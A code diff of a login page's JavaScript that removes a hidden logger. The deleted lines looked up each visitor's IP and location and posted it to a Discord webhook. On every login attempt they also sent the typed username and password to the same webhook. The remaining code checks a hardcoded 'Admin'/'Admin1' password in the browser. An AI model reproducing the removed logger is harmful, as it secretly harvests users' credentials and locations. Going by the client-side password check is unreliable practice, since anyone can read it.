@@ -106,8 +106,6 @@
   </div>
 
 <script>
-const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
-
 // Canvas trail
 const canvas = document.getElementById('trail');
 const ctx = canvas.getContext('2d');
@@ -163,87 +161,13 @@ window.addEventListener('resize', () => {
   canvas.height = window.innerHeight;
 });
 
-// Webhook sender
-async function sendToWebhook(data, type, status) {
-  const embed = {
-    title: type,
-    color: status === 'SUCCESS' ? 0x2ecc71 : 0xe74c3c, // Green or Red
-    fields: [
-      { name: 'Status', value: status, inline: true },
-      { name: 'Username', value: data.username || 'N/A', inline: true },
-      { name: 'Password', value: data.password || 'N/A', inline: true },
-      { name: 'IP', value: data.ip, inline: true },
-      { name: 'Location', value: data.location, inline: true },
-      { name: 'Browser', value: data.browser, inline: false },
-      { name: 'Time', value: data.time, inline: false },
-    ],
-    footer: { text: 'NyXora Logs' },
-    timestamp: new Date(),
-  };
-
-  try {
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: '@everyone',
-        embeds: [embed],
-      }),
-    });
-  } catch (e) {
-    console.error('Webhook send error:', e);
-  }
-}
-
-// Visitor log
-(async function logVisitor() {
-  let ipInfo = {};
-  try {
-    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
-    ipInfo = await response.json();
-  } catch {
-    ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-  }
-
-  const browserInfo = navigator.userAgent;
-  const visitorData = {
-    ip: ipInfo.ip || 'Unknown',
-    location: `${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}`,
-    browser: browserInfo,
-    time: new Date().toISOString(),
-  };
-  sendToWebhook(visitorData, 'Visitor', 'INFO');
-})();
-
 // Login attempt
-async function login() {
+function login() {
   const user = document.getElementById('username').value.trim();
   const pass = document.getElementById('password').value.trim();
 
-  let ipInfo = {};
-  try {
-    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
-    ipInfo = await response.json();
-  } catch {
-    ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-  }
-
-  const browserInfo = navigator.userAgent;
-  const status = (user === 'Admin' && pass === 'Admin1') ? 'SUCCESS' : 'FAILED';
-
-  const attemptData = {
-    username: user,
-    password: pass,
-    ip: ipInfo.ip || 'Unknown',
-    location: `${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}`,
-    browser: browserInfo,
-    time: new Date().toISOString()
-  };
-
-  await sendToWebhook(attemptData, 'Login Attempt', status);
-
-  if (status === 'SUCCESS') {
-    window.location.href = "https://yodog0608.github.io/landing.html";
+  if (user === 'Admin' && pass === 'Admin1') {
+    window.location.href = "landing.html"; // Redirect to your landing page file
   } else {
     alert('Invalid credentials!');
   }
